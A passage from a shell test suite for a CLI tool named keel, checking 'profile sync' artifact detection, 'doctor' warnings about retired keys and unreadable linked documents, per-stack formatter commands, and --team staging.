    i=0; while [ "$i" -lt "$n" ]; do printf 'x\n' > "$d/$root/prd/p$i.md"; i=$((i+1)); done
    out="$( cd "$d" && "$KEEL" profile sync 2>&1 )"
    got="$(prof_of "$d" artifacts.prd)"
    [ "$got" = "None" ] && ok "sync leaves prd null with $n PRD(s) present" \
      || bad "profile sync" "sync filled artifacts.prd with '$got' from $n file(s)"
    case "$out" in
      *prd*stories*architecture*) ok "sync says why it skips prd, stories and architecture" ;;
      *) bad "profile sync" "sync skipped three keys and said nothing: '$out'" ;;
    esac
    rm -rf "$d"
done

# S-07, FR-13. repo-snapshot emits snapshot-<unit>.md per unit in a monorepo and the key is a single
# string, so it cannot hold them and stays null. The second case is what stops a naive glob:
# `snapshot*.md` would match the per-unit files and pick one.
d="$(fixture node-ts)"
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
root="$(prof_of "$d" docs_root)"
printf 'x\n' > "$d/$root/snapshot-api.md"; printf 'x\n' > "$d/$root/snapshot-web.md"
( cd "$d" && "$KEEL" profile sync >/dev/null 2>&1 )
got="$(prof_of "$d" artifacts.snapshot)"
[ "$got" = "None" ] && ok "a monorepo leaves snapshot null" \
  || bad "profile sync" "per-unit snapshots filled artifacts.snapshot with '$got'"
printf 'x\n' > "$d/$root/snapshot.md"
( cd "$d" && "$KEEL" profile sync >/dev/null 2>&1 )
got="$(prof_of "$d" artifacts.snapshot)"
[ "$got" = "$root/snapshot.md" ] && ok "a root snapshot beside per-unit ones is still recorded" \
  || bad "profile sync" "got '$got', want '$root/snapshot.md'"
rm -rf "$d"

# S-04, FR-06. An empty docs/decisions means the project has no decision records. Setting the key
# would be literally true, useless to every reader, and would silence doctor's warning for a
# directory with nothing in it.
d="$(fixture node-ts)"
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
root="$(prof_of "$d" docs_root)"
mkdir -p "$d/$root/decisions"
rm -f "$d/$root/decisions/"*
( cd "$d" && "$KEEL" profile sync >/dev/null 2>&1 )
got="$(prof_of "$d" artifacts.decisions)"
[ "$got" = "None" ] && ok "an empty docs directory leaves its key null" \
  || bad "profile sync" "an empty decisions directory was recorded as '$got'"

# keel init scaffolds decisions/ADR-0000-template.md, so this directory is never empty on a fresh
# project. Counting the template would set the key and warn on every newly initialised repository
# before anyone had written a decision. Found by prototyping, 2026-08-30, and FR-06 amended for it.
printf 'x\n' > "$d/$root/decisions/ADR-0000-template.md"
( cd "$d" && "$KEEL" profile sync >/dev/null 2>&1 )
got="$(prof_of "$d" artifacts.decisions)"
[ "$got" = "None" ] && ok "a directory holding only keel's own template leaves its key null" \
  || bad "profile sync" "the scaffolded ADR template was counted as a document: '$got'"

# A directory kept in git by a lone .gitkeep is still empty of documents.
printf '' > "$d/$root/decisions/.gitkeep"
( cd "$d" && "$KEEL" profile sync >/dev/null 2>&1 )
got="$(prof_of "$d" artifacts.decisions)"
[ "$got" = "None" ] && ok "a directory holding only .gitkeep leaves its key null" \
  || bad "profile sync" "a .gitkeep-only directory was recorded as '$got'"

printf 'x\n' > "$d/$root/decisions/ADR-0001-x.md"
( cd "$d" && "$KEEL" profile sync >/dev/null 2>&1 )
got="$(prof_of "$d" artifacts.decisions)"
[ "$got" = "$root/decisions" ] && ok "one document is enough to record the directory" \
  || bad "profile sync" "got '$got', want '$root/decisions'"
rm -rf "$d"

# S-06, FR-14. cmd_profile already refuses both cases for get and set, and sync inherits them by
# entering through the same function. This is the assertion proving it, so that a later refactor
# that gives sync its own entry point is caught rather than shipped.
d="$(mktemp -d)"
out="$( cd "$d" && "$KEEL" profile sync 2>&1 )"
case "$out" in
  *"Run 'keel init'"*) ok "profile sync refuses without a profile" ;;
  *) bad "profile sync" "no profile gave '$out', want the shared 'Run keel init' refusal" ;;
esac
rm -rf "$d"

# FR-01. A subcommand whose own sibling error message denies it exists is not beside get and set.
d="$(fixture node-ts)"
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
out="$( cd "$d" && "$KEEL" profile frobnicate 2>&1 )"
case "$out" in
  *get*set*sync*) ok "an unknown profile subcommand names sync" ;;
  *) bad "profile sync" "the unknown-subcommand message does not name sync: '$out'" ;;
esac
rm -rf "$d"

# FR-16. A profile whose artifacts object is missing a key is not a typo the caller made, but
# profile_set's refusal says it is: "a path that does not exist is far more often a typo". sync
# reaches that message on a hand-written profile or one older than the artifacts map, and keel's own
# profile says it was hand-written. json_get already separates the two cases, returning non-zero for
# an absent key and zero with empty output for a null, so an absent key is skipped rather than
# attempted. Found in review, 2026-08-30.
d="$(fixture node-ts)"
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
root="$(prof_of "$d" docs_root)"
mkdir -p "$d/$root/plans" "$d/$root/decisions"
printf 'x\n' > "$d/$root/plans/p.md"
printf 'x\n' > "$d/$root/decisions/ADR-0001-x.md"
python3 - "$d" <<'PY_DROP'
import json, pathlib, sys
p = pathlib.Path(sys.argv[1]) / ".keel/profile.json"
j = json.loads(p.read_text()); j["artifacts"].pop("plans", None)
p.write_text(json.dumps(j, indent=2) + "\n")
PY_DROP
out="$( cd "$d" && "$KEEL" profile sync 2>&1 )"; rc=$?
[ "$rc" -eq 0 ] && ok "sync skips an artifact key the profile does not have" \
  || bad "profile sync" "sync exited $rc on a profile missing artifacts.plans: '$out'"
case "$out" in
  *typo*) bad "profile sync" "sync blamed the caller for a key the profile never had: '$out'" ;;
  *) ok "sync does not report a missing key as a typo" ;;
esac
# The keys that are there are still filled: skipping one must not abandon the run.
got="$(prof_of "$d" artifacts.decisions)"
[ "$got" = "$root/decisions" ] && ok "sync fills the remaining keys when one is absent" \
  || bad "profile sync" "got '$got', want '$root/decisions'"
rm -rf "$d"

# S-08, FR-10, FR-11, NFR-03. A null key whose default is present means the profile does not know
# about a document sitting in docs_root. A warning and never a failure, because nothing is broken
# and the remedy is one command. Shape follows the stack.has_ui warning at `bin/keel#good "verify.$k set (not run, --fast)"`.
d="$(fixture node-ts)"
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
root="$(prof_of "$d" docs_root)"
mkdir -p "$d/$root/plans" "$d/$root/prd"
printf 'x\n' > "$d/$root/plans/2026-01-01-x.md"
printf 'x\n' > "$d/$root/prd/p0.md"
out="$( cd "$d" && "$KEEL" doctor 2>&1 )"
case "$out" in
  *"artifacts.plans"*"keel profile sync"*) ok "doctor names profile sync for a fillable null key" ;;
  *) bad "doctor" "no sync warning for a null artifacts.plans beside $root/plans" ;;
esac
# FR-11. prd has no remedy under FR-04, so naming one would send people to a command that
# deliberately does nothing for them. This is the assertion that keeps the warning honest.
case "$out" in
  *artifacts.prd*) bad "doctor" "doctor warned about artifacts.prd, which sync will not fill" ;;
  *) ok "doctor says nothing about a key sync cannot fill" ;;
esac
# FR-10. A warning, never a failure. Nothing here is broken.
case "$out" in
  *"FAIL"*"artifacts.plans"*) bad "doctor" "the sync nudge was raised as a failure, not a warning" ;;
  *) ok "the sync nudge is a warning, not a failure" ;;
esac
# NFR-03. --fast is where most people will meet it, so it has to be reached there too.
out="$( cd "$d" && "$KEEL" doctor --fast 2>&1 )"
case "$out" in
  *"keel profile sync"*) ok "doctor --fast reports it too" ;;
  *) bad "doctor" "--fast did not print the sync warning" ;;
esac
rm -rf "$d"

# S-09, FR-12. Without this the command is discoverable only from doctor's warning, which a user
# reaches only if their tree already has the gap it solves.
#
# Asserted as `profile sync` rather than as one combined `get|set|sync` line. The first version
# pinned the combined shape, and review then found that shape misleading: it reads as though sync
# takes the <dotted.path> and [value] that only get and set take. The requirement is that --help
# names the subcommand, not how the line is punctuated, so the assertion now tests the requirement.
out="$( "$KEEL" --help 2>&1 )"
case "$out" in
  *"profile sync"*) ok "keel --help names profile sync" ;;
  *) bad "help" "--help does not name profile sync" ;;
esac
# It must not claim sync takes the arguments only get and set take.
case "$out" in
  *"profile sync <dotted.path>"*|*"profile get|set|sync <dotted.path>"*)
      bad "help" "--help implies profile sync takes a dotted path, which it does not" ;;
  *)  ok "--help does not imply profile sync takes arguments" ;;
esac

# ---- formatters, and the check against write split ------------------------
# A gate needs a command that reports without rewriting, which is what verify.format now holds;
# the writing variant is verify.format_fix, so a refusal can name the remedy. Before this, format
# was detected for npm alone and every other stack carried null, which makes a format gate a
# no-op on five stacks out of seven while reading as though it were switched on.

# go and rust ship their formatter with the toolchain, so naming it is not a guess.
d="$(fixture go)"
v_format="$(detect_in "$d" 'detect_verify format')"
v_format_fix="$(detect_in "$d" 'detect_verify format_fix')"
[ "$v_format" = 'test -z "$(gofmt -l .)"' ] \
  && ok "go gets a check-only formatter" || bad "go format" "got '$v_format'"
[ "$v_format_fix" = "gofmt -w ." ] \
  && ok "go gets the writing variant separately" || bad "go format_fix" "got '$v_format_fix'"
rm -rf "$d"

d="$(mktemp -d)"
( cd "$d" && git init -q -b main . && git config user.email t@t.t && git config user.name t
  printf '[package]\nname = "f"\n' > Cargo.toml )
v_format="$(detect_in "$d" 'detect_verify format')"
v_format_fix="$(detect_in "$d" 'detect_verify format_fix')"
[ "$v_format" = "cargo fmt --check" ] \
  && ok "rust gets a check-only formatter" || bad "rust format" "got '$v_format'"
[ "$v_format_fix" = "cargo fmt" ] \
  && ok "rust gets the writing variant separately" || bad "rust format_fix" "got '$v_format_fix'"
rm -rf "$d"

# npm is the case that motivated the split: `npm run format` rewrites, so it cannot be the gate.
d="$(mktemp -d)"
( cd "$d" && git init -q -b main . && git config user.email t@t.t && git config user.name t
  printf '{"name":"f","scripts":{"test":"jest","format":"prettier --write ."}}' > package.json )
v_format="$(detect_in "$d" 'detect_verify format')"
v_format_fix="$(detect_in "$d" 'detect_verify format_fix')"
[ -z "$v_format" ] \
  && ok "a writing npm format script does not become the gate" || bad "npm format" "got '$v_format'"
[ "$v_format_fix" = "npm run format" ] \
  && ok "a writing npm format script becomes format_fix" || bad "npm format_fix" "got '$v_format_fix'"
rm -rf "$d"

d="$(mktemp -d)"
( cd "$d" && git init -q -b main . && git config user.email t@t.t && git config user.name t
  printf '{"name":"f","scripts":{"test":"jest","format":"prettier --write .","format:check":"prettier --check ."}}' > package.json )
v_format="$(detect_in "$d" 'detect_verify format')"
[ "$v_format" = "npm run format:check" ] \
  && ok "a declared format:check earns the gate slot" || bad "npm format:check" "got '$v_format'"
rm -rf "$d"

# Declared tools only for python, php and java: none of them ships a formatter with the runtime,
# so an undeclared one is a command that fails at first use.
d="$(mktemp -d)"
( cd "$d" && git init -q -b main . && git config user.email t@t.t && git config user.name t
  printf '[project]\nname = "f"\n[tool.ruff]\nline-length = 100\n' > pyproject.toml )
v_format="$(detect_in "$d" 'detect_verify format')"
[ "$v_format" = "ruff format --check ." ] \
  && ok "python with ruff declared gets ruff format --check" || bad "ruff format" "got '$v_format'"
rm -rf "$d"

d="$(fixture python)"
v_format="$(detect_in "$d" 'detect_verify format')"
[ -z "$v_format" ] \
  && ok "python with no formatter declared gets null, not a guess" || bad "python format" "got '$v_format'"
rm -rf "$d"

d="$(mktemp -d)"
( cd "$d" && git init -q -b main . && git config user.email t@t.t && git config user.name t
  echo '{"name":"f/f"}' > composer.json && mkdir -p vendor/bin && touch vendor/bin/pint )
v_format="$(detect_in "$d" 'detect_verify format')"
v_format_fix="$(detect_in "$d" 'detect_verify format_fix')"
[ "$v_format" = "vendor/bin/pint --test" ] \
  && ok "php with pint installed gets pint --test" || bad "pint format" "got '$v_format'"
[ "$v_format_fix" = "vendor/bin/pint" ] \
  && ok "php gets the writing variant separately" || bad "pint format_fix" "got '$v_format_fix'"
rm -rf "$d"

d="$(mktemp -d)"
( cd "$d" && git init -q -b main . && git config user.email t@t.t && git config user.name t
  printf 'plugins { id "com.diffplug.spotless" version "6.25.0" }\n' > build.gradle )
v_format="$(detect_in "$d" 'detect_verify format')"
v_format_fix="$(detect_in "$d" 'detect_verify format_fix')"
[ "$v_format" = "./gradlew spotlessCheck" ] \
  && ok "gradle with spotless declared gets spotlessCheck" || bad "spotless format" "got '$v_format'"
[ "$v_format_fix" = "./gradlew spotlessApply" ] \
  && ok "gradle gets the writing variant separately" || bad "spotless format_fix" "got '$v_format_fix'"
rm -rf "$d"

# ---- the default branch is not the checked-out branch --------------------
d="$(fixture node-ts)"
( cd "$d" && git checkout -q -b feature-x )
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
got="$(prof_of "$d" conventions.default_branch)"
if [ "$got" = "main" ]; then ok "default_branch is the repo default, not the checked-out branch"
else bad "default_branch" "got '$got' while on feature-x"; fi
rm -rf "$d"

# ---- --team ---------------------------------------------------------------
# --team exists so a teammate's clone carries the SOP. Everything init wrote has to be staged,
# .gitignore included: it holds the rule keeping the bypassPermissions settings.local.json out of
# the repo, and unstaged, the teammate who clones commits that file.

d="$(fixture node-ts)"
( cd "$d" && "$KEEL" init -y --team >/dev/null 2>&1 )
staged="$( cd "$d" && git diff --cached --name-only )"
for want in .keel/profile.json CLAUDE.md AGENTS.md .claude/settings.json .claude/keel-nudge \
            docs/keel/README.md .gitignore; do
    printf '%s\n' "$staged" | grep -qxF "$want" && ok "--team stages $want" \
      || bad "--team staging" "$want is not in the index"
done
printf '%s\n' "$staged" | grep -qxF .claude/settings.local.json \
  && bad "--team staging" "settings.local.json was staged; it must never be committed" \
  || ok "--team does not stage settings.local.json"
rm -rf "$d"

# Outside a git repo there is no index, so the success line would be a lie.
d="$(mktemp -d)"
printf '{"name":"f","scripts":{"test":"jest"}}\n' > "$d/package.json"
out="$( cd "$d" && "$KEEL" init -y --team 2>&1 )"
case "$out" in
  *"Staged for commit"*) bad "--team without git" "reported staging in a directory with no repo" ;;
  *"not a git repository"*) ok "--team says nothing was staged when there is no repo" ;;
  *) bad "--team without git" "said neither; output was: $out" ;;
esac
rm -rf "$d"

# ---- doctor ---------------------------------------------------------------

d="$(fixture node-ts)"
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
seed_standards "$d"

# FR-16: doctor says nothing about explain_level. The schema drift message is the whole mechanism
# for getting the key into an existing project, and a nudge for an optional preference key would
# print on every run of every project that is content with the default, which is most of them.
#
# Both states are checked, and the stale one is the point. A freshly initialised profile is already
# at the current schema version, so the drift branch never runs against it: the first version of
# this case checked only that state and therefore could not fail for the reason written above. A
# nudge added inside the drift message would have passed it. Caught in review.
out="$( cd "$d" && "$KEEL" doctor 2>&1 )"
case "$out" in
    *explain_level*) bad "doctor" "doctor named explain_level on a current profile; FR-16 says the drift message is the whole mechanism" ;;
    *) ok "doctor says nothing about explain_level on a current profile" ;;
esac

python3 - "$d" <<'PY_STALE'
import json, pathlib, sys
p = pathlib.Path(sys.argv[1]) / ".keel/profile.json"
j = json.loads(p.read_text())
j["schema_version"] = 1
j.get("conventions", {}).pop("explain_level", None)
p.write_text(json.dumps(j, indent=2) + "\n")
PY_STALE
out="$( cd "$d" && "$KEEL" doctor 2>&1 )"
case "$out" in
    *"schema version"*) ok "doctor reports drift on a profile older than the installed keel" ;;
    *) bad "doctor" "no drift warning on a schema_version 1 profile; that message is how the key reaches an existing project" ;;
esac
case "$out" in
    *explain_level*) bad "doctor" "doctor named explain_level in the drift path; FR-16 says the version message is the whole mechanism" ;;
    *) ok "doctor says nothing about explain_level on a stale profile either" ;;
esac
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
# jest is not installed in the fixture, so verify.test cannot run: doctor must say so.
if ( cd "$d" && "$KEEL" doctor >/dev/null 2>&1 ); then
  bad "doctor verify" "passed with an unrunnable command"
else ok "doctor fails when a verify command does not run"; fi

# Point verify.test at something that works, and doctor should pass.
python3 - "$d" <<'PY'
import json,sys,pathlib
p=pathlib.Path(sys.argv[1])/".keel/profile.json"; d=json.loads(p.read_text())
d["verify"]={"test":"true","test_one":"true","lint":"true","typecheck":None,"build":None,
             "format":None,"e2e":None,"security":None}
p.write_text(json.dumps(d,indent=2)+"\n")
PY
if ( cd "$d" && "$KEEL" doctor >/dev/null 2>&1 ); then ok "doctor passes on a healthy project"
else bad "doctor healthy" "exited non-zero"; fi

# has_ui is written once, at init, and a project grows a user interface later. Nothing re-runs the
# detector after that, so doctor is the only place the drift can surface.
out="$( cd "$d" && "$KEEL" doctor 2>&1 )"
case "$out" in *"stack.has_ui"*) bad "has_ui drift" "doctor nudged a project with no interface" ;;
  *) ok "doctor says nothing about has_ui on a project with no interface" ;; esac

printf '<!doctype html>\n' > "$d/index.html"
out="$( cd "$d" && "$KEEL" doctor 2>&1 )"
case "$out" in *"keel profile set stack.has_ui true"*)
    ok "doctor names the command that corrects has_ui drift" ;;
  *) bad "has_ui drift" "doctor said nothing about a project that grew an interface" ;; esac

# A warning and never a failure. The detector reads a bare `public/` directory as an interface, so
# it is right often enough to be worth saying and not right enough to stop anyone working.
( cd "$d" && "$KEEL" doctor >/dev/null 2>&1 ) && ok "the has_ui nudge warns without failing" \
  || bad "has_ui drift" "doctor failed over the nudge"
rm -f "$d/index.html"

# A missing test_one is a required field per the commit-guard decision.
python3 - "$d" <<'PY'
import json,sys,pathlib
p=pathlib.Path(sys.argv[1])/".keel/profile.json"; d=json.loads(p.read_text())
d["verify"]["test_one"]=None
p.write_text(json.dumps(d,indent=2)+"\n")
PY
if ( cd "$d" && "$KEEL" doctor >/dev/null 2>&1 ); then bad "doctor test_one" "passed"
else ok "doctor fails when verify.test_one is absent"; fi
rm -rf "$d"

# ---- a key a schema version retired -----------------------------------------
# Schema 4 is the first version that only removes keys, and every warning keel had about a stale
# profile was written for versions that add them. Doctor keys off schema_version and init merges,
# so `keel init` on a schema 3 profile returns schema_version 4 with all six retired keys still in
# the file, after which doctor reports the profile is at the version this keel expects and never
# mentions them again. The prescribed remedy silenced the only thing reporting the problem.
#
# Reported against a register, not against the schema. Every object in
# templates/profile.schema.json is additionalProperties: true on purpose, so a key the schema does
# not declare is not thereby wrong: a project may carry keys of its own and keel must not nag about
# them. Only a key keel itself removed can be named, and only a list of those can name a remedy.
rk="$(fixture node-ts)"
( cd "$rk" && "$KEEL" init -y >/dev/null 2>&1 )
seed_standards "$rk"
python3 - "$rk" <<'PY_RETIRED'
import json, pathlib, sys
p = pathlib.Path(sys.argv[1]) / ".keel/profile.json"
j = json.loads(p.read_text())
# Two retired keys, from two different parents, so a walk that only looks under gates is caught.
j.setdefault("gates", {})["tdd"] = "required"
j.setdefault("observability", {})["log_shipping"] = "otlp"
# And two keys this project invented, which additionalProperties: true permits and doctor must
# leave alone. This is the case open question 3 said such a rule would need.
j["team"] = {"oncall_rota": "https://wiki.example/rota"}
j.setdefault("conventions", {})["house_style"] = "terse"
j["verify"] = {"test": "true", "test_one": "true", "lint": "true", "typecheck": None,
               "build": None, "format": None, "e2e": None, "security": None}
p.write_text(json.dumps(j, indent=2) + "\n")
PY_RETIRED
out="$( cd "$rk" && "$KEEL" doctor 2>&1 )"
case "$out" in
  *'sets gates.tdd, retired in schema 4'*) ok "doctor names a retired key and the version that retired it" ;;
  *) bad "doctor names a retired key and the version that retired it" "$out" ;;
esac
# The remedy, not just the name. A key that is gone with no sentence about what to do instead sends
# the reader to a schema row that no longer exists.
case "$out" in
  *'observability.backend'*) ok "doctor gives the remedy for a retired key" ;;
  *) bad "doctor gives the remedy for a retired key" "$out" ;;
esac
# Both parents, because a walk rooted at one object would pass the case above on its own.
case "$out" in
  *'sets observability.log_shipping, retired in schema 4'*) ok "doctor names a retired key under a second parent" ;;
  *) bad "doctor names a retired key under a second parent" "$out" ;;
esac
# A warning and never a failure. The key does nothing, so nothing is broken, and a profile someone
# cannot fix without editing a file by hand is not a reason to stop them working.
if ( cd "$rk" && "$KEEL" doctor >/dev/null 2>&1 ); then
  ok "a retired key warns without failing doctor"
else bad "a retired key warns without failing doctor" "doctor exited non-zero"; fi
case "$out" in
  *'FAIL'*'retired in schema'*) bad "a retired key warns without failing doctor" "raised as FAIL" ;;
  *) ok "the retired-key line is a WARN, not a FAIL" ;;
esac
# The additionalProperties: true case. Neither of these is in the schema and neither is retired.
case "$out" in
  *oncall_rota*|*house_style*) bad "doctor says nothing about a key the project added itself" "$out" ;;
  *) ok "doctor says nothing about a key the project added itself" ;;
esac
# And nothing at all on a profile carrying none of the six, which is every profile keel writes now.
python3 - "$rk" <<'PY_CLEAN'
import json, pathlib, sys
p = pathlib.Path(sys.argv[1]) / ".keel/profile.json"
j = json.loads(p.read_text())
j["gates"].pop("tdd", None)
j["observability"].pop("log_shipping", None)
p.write_text(json.dumps(j, indent=2) + "\n")
PY_CLEAN
out="$( cd "$rk" && "$KEEL" doctor 2>&1 )"
case "$out" in
  *'retired in schema'*) bad "doctor says nothing about retirement on a profile that has none" "$out" ;;
  *) ok "doctor says nothing about retirement on a profile that has none" ;;
esac
rm -rf "$rk"

# ---- verify.e2e and verify.security are named, and never run ---------------
# verify.e2e and verify.security were written into every profile by write_profile and read by
# nothing, so a user saw a real command sitting in a real field with nothing behind it. Doctor
# names them without running them: e2e needs an environment doctor cannot provide and security
# reaches the network.
#
# fixture node-ts, NOT a bare git init. An empty directory detects as project.kind "docs", and the
# whole verify block including this loop sits inside doctor's `kind != docs` guard, so on a bare
# fixture doctor prints no verify line at all and the cases below would fail forever while looking
# like a bug in the new loop. Confirmed by running it on 2026-09-07.
we="$(fixture node-ts)"
( cd "$we" && "$KEEL" init -y >/dev/null 2>&1 )
# verify.e2e is a command that leaves evidence behind, not a plausible-looking one. The last two
# cases assert doctor did not run it, and the only way to assert that without trusting the output
# string is to give it something whose having run is a fact on disk. Relative, because doctor's
# `( eval "$c" )` inherits the cwd this subshell sets.
#
# `keel profile set` rather than a python heredoc. It is the idiom this file already uses, in the
# cases that set a string containing spaces and clear a value to null, and it refuses a path the
# profile does not have, so if either key were dropped from the schema this test would fail loudly
# instead of quietly writing a key nothing reads and passing anyway.
( cd "$we" && "$KEEL" profile set verify.e2e 'touch e2e-ran-sentinel' >/dev/null 2>&1 )
( cd "$we" && "$KEEL" profile set verify.security null >/dev/null 2>&1 )
out="$( cd "$we" && "$KEEL" doctor --fast 2>&1 )"
case "$out" in
  *'verify.e2e is set (declared, not run): touch e2e-ran-sentinel'*)
    ok "doctor names a declared verify.e2e without running it" ;;
  *) bad "doctor names a declared verify.e2e without running it" "$out" ;;
esac
# null reports as ok, not WARN. keel has no detector for either key, so a warning here fires on
# every project ever created and no keel command can clear it; docs/standards.md:79 calls that the
# unrecoverable kind of wrong. Asserting the `ok` prefix, because asserting the bare sentence
# would pass a WARN too and that is the whole distinction this case exists to hold.
case "$out" in
  *'ok    verify.security is null'*) ok "doctor reports a null verify.security as ok, not a warning" ;;
  *) bad "doctor reports a null verify.security as ok, not a warning" "$out" ;;
esac
# The command must not have run, asserted on disk rather than on the output string. An earlier
# version of this case matched on doctor's wording instead, and a review proved by mutation that it
# passed an implementation which ran the command but short-circuited on --fast, which is the mode
# this case invokes. The sentinel cannot be fooled that way: either the file is there or it is not.
if [ -e "$we/e2e-ran-sentinel" ]; then
  bad "doctor --fast does not execute verify.e2e" "the sentinel file exists, so the command ran"
else
  ok "doctor --fast does not execute verify.e2e"
fi
# The same assertion without --fast, and this is the one with teeth. A review proved by mutation
# that the case above passes an implementation which runs the command but short-circuits on --fast:
# nothing asserted under --fast can see such a path, so the sentinel there catches only a loop that
# always runs. Plain doctor costs about a second on this fixture, measured 2026-09-08: npm test,
# lint, typecheck and build each fail immediately with no node_modules installed. Both keys carry a
# sentinel, because one loop serves both and a mutation running only the security branch would
# otherwise go unseen.
( cd "$we" && "$KEEL" profile set verify.security 'touch security-ran-sentinel' >/dev/null 2>&1 )
full="$( cd "$we" && "$KEEL" doctor 2>&1 )"
if [ -e "$we/e2e-ran-sentinel" ] || [ -e "$we/security-ran-sentinel" ]; then
  bad "doctor runs neither verify.e2e nor verify.security without --fast" "$full"
else
  ok "doctor runs neither verify.e2e nor verify.security without --fast"
fi
rm -rf "$we"

# ---- but a project with no tests at all is a different thing ---------------
# Found by running init on a real project with no test script and no runner. verify.test is a WARN
# and verify.test_one a FAIL, so the profile init had just written failed its own doctor on the
# derived field while the root cause was only a warning, and the init note named the warned field
# rather than the failing one. A missing test_one is an oversight only when there are tests to run.

d="$(fixture node-ts)"
printf '{"name":"f"}\n' > "$d/package.json"; rm -f "$d/tsconfig.json"
out="$( cd "$d" && "$KEEL" init -y 2>&1 )"
seed_standards "$d"
case "$out" in *verify.test_one*) ok "the init note names verify.test_one, not just verify.test" ;;
  *) bad "no tests" "the init note never mentioned verify.test_one" ;; esac
out="$( cd "$d" && "$KEEL" doctor 2>&1 )"; rc=$?
case "$out" in *FAIL*test_one*) bad "no tests" "doctor FAILs on test_one where there is no test command either" ;;
  *) ok "doctor does not fail on test_one when verify.test is null too" ;; esac
[ "$rc" -eq 0 ] && ok "and the profile init just wrote passes its own doctor" \
  || bad "no tests" "doctor exited $rc on a project with nothing to run"
rm -rf "$d"

# ---- documents a fresh clone cannot read ----------------------------------
# Both pilots hit this from opposite ends: forex ignored its whole docs root, agroplex ignores 25 of
# its 28 documents and links three of them from the README. The author never sees it, because the
# files are on their disk, and `git status` is structurally blind to ignored files so the natural
# check comes back clean.
#
# Baselined before this check existed. Two agents reviewed agroplex's documentation, one of them
# asked outright what a fresh clone gets. Both read the unreadable files and reported them as
# content problems: "those three linked docs are ~6 months stale" for files that are not in HEAD at
# all, the date coming from `git log`, which answers happily for a path HEAD does not carry. The
# second went on to recommend linking a fourth document that is also ignored.

# The node-ts fixture declares jest, which is not installed, so doctor fails on verify.test alone.
# Without this the exit-code assertions below would hold whether or not the check exists.
runnable_verify() {
    python3 - "$1" <<'PY'
import json,sys,pathlib
p=pathlib.Path(sys.argv[1])/".keel/profile.json"; d=json.loads(p.read_text())
d["verify"]={"test":"true","test_one":"true","lint":"true","typecheck":None,"build":None,
             "format":None,"e2e":None,"security":None}
p.write_text(json.dumps(d,indent=2)+"\n")
PY
}

# The agroplex shape exactly: a directory ignored wholesale, one document committed before the rule
# and so still tracked, another removed from the index and now unreachable.
d="$(fixture node-ts)"
( cd "$d" || exit 1
  mkdir -p project_documentation
  printf 'kept\n' > project_documentation/KEPT.md
  printf 'gone\n' > project_documentation/GONE.md
  cat > README.md <<'R'
# f

- [kept](./project_documentation/KEPT.md)
- [gone](./project_documentation/GONE.md)
- [upstream](https://example.com/GONE.md)
R
  git add -A >/dev/null 2>&1 && git commit -q -m init
  git rm -q --cached project_documentation/GONE.md
  printf 'project_documentation/*\n' >> .gitignore
  git add .gitignore >/dev/null 2>&1 && git commit -q -m ignore
  "$KEEL" init -y >/dev/null 2>&1 )
runnable_verify "$d"

out="$( cd "$d" && "$KEEL" doctor 2>&1 || true )"

case "$out" in *"project_documentation/GONE.md"*)
    ok "doctor names a referenced document that is not in HEAD" ;;
  *) bad "referenced docs" "said nothing about a README link a fresh clone cannot open" ;; esac

case "$out" in *"project_documentation/KEPT.md"*)
    bad "referenced docs" "flagged a document that is committed and readable" ;;
  *) ok "doctor leaves the sibling document that is tracked alone" ;; esac

case "$out" in *"example.com"*)
    bad "referenced docs" "flagged an external link, which git cannot carry either way" ;;
  *) ok "doctor ignores links that are not repository paths" ;; esac

# Ignored is a FAIL rather than a WARN: committing does not fix it, the ignore rule has to change
# first, so it is not something the next `git add` clears.
if ( cd "$d" && "$KEEL" doctor >/dev/null 2>&1 ); then
  bad "referenced docs" "doctor passed with a README link no teammate can follow"
else ok "doctor fails on a referenced document the ignore rule keeps out"; fi
rm -rf "$d"

# ---- untracked but not ignored is a warning -------------------------------
# The same defect with a different remedy, and the distinction is the point: this one clears with
# `git add`, so failing on it would fire on every document between being written and being
# committed, which is every document keel itself has just written.

d="$(fixture node-ts)"
( cd "$d" || exit 1
  printf '# f\n\n- [notes](./NOTES.md)\n' > README.md
  printf 'notes\n' > NOTES.md
  git add README.md >/dev/null 2>&1 && git commit -q -m init
  "$KEEL" init -y >/dev/null 2>&1 )
runnable_verify "$d"
seed_standards "$d"

out="$( cd "$d" && "$KEEL" doctor 2>&1 || true )"
case "$out" in *WARN*NOTES.md*) ok "an uncommitted referenced document warns rather than fails" ;;
  *) bad "referenced docs" "expected a WARN naming NOTES.md, got: $(printf '%s\n' "$out" | grep -i notes || echo none)" ;; esac
( cd "$d" && "$KEEL" doctor >/dev/null 2>&1 ) \
  && ok "and doctor still exits 0 on it" \
  || bad "referenced docs" "doctor failed over a document that only needs committing"
rm -rf "$d"

# ---- a link that climbs out of the docs root ------------------------------
# Found by running the finished check against keel itself, which reported five of its own committed
# files missing. `git cat-file -e HEAD:docs/../templates/x.md` does not resolve: git never
# normalises `..` in a tree path, and a document linking a sibling directory is the common case.

d="$(fixture node-ts)"
( cd "$d" || exit 1
  printf '# f\n' > README.md
  mkdir -p templates
  printf 'x\n' > templates/BLOCK.md
  git add -A >/dev/null 2>&1 && git commit -q -m init
  "$KEEL" init -y >/dev/null 2>&1
  printf '\nSee [the block](../templates/BLOCK.md).\n' >> docs/keel/NEXT-STEPS.md
  git add -A >/dev/null 2>&1 && git commit -q -m docs )
runnable_verify "$d"

out="$( cd "$d" && "$KEEL" doctor 2>&1 || true )"
case "$out" in *BLOCK.md*)
    bad "referenced docs" "reported a committed file as unreadable through a '..' link: $(printf '%s\n' "$out" | grep BLOCK.md)" ;;
  *) ok "a '..' link to a committed file resolves" ;; esac
rm -rf "$d"

# ---- CLAUDE.md and AGENTS.md are read too ---------------------------------
# The two files most likely to point an agent at a document, and the two keel writes into itself.

d="$(fixture node-ts)"
( cd "$d" || exit 1
  printf '# f\n' > README.md
  mkdir -p internal && printf 'x\n' > internal/RULES.md
  printf 'internal/\n' >> .gitignore
  git add -A >/dev/null 2>&1 && git commit -q -m init
  "$KEEL" init -y >/dev/null 2>&1
  printf '\nSee [the rules](internal/RULES.md).\n' >> CLAUDE.md )

out="$( cd "$d" && "$KEEL" doctor 2>&1 || true )"
